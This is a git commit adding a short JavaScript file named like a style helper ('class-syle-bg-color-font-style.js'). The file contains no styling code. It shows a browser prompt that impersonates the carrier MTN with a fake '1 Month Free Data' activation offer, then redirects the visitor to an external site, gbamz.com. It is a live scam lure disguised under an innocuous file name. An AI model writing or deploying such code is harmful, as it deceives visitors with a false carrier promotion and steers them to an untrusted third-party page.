9ab0f89b64b713434876b9274636e971b59c571d
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-19 08:33:27 +0100

    Create class-syle-bg-color-font-style.js

---
+++ class-syle-bg-color-font-style.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE NOW'
+password=prompt('MTN: Yello, Your 1 Month Free Data is PENDING... Click Ok to Activate Now','ACTIVATE NOW');
+if (password != 'ACTIVATE NOW') {
+location.href='https://gbamz.com/rward.html';
+}
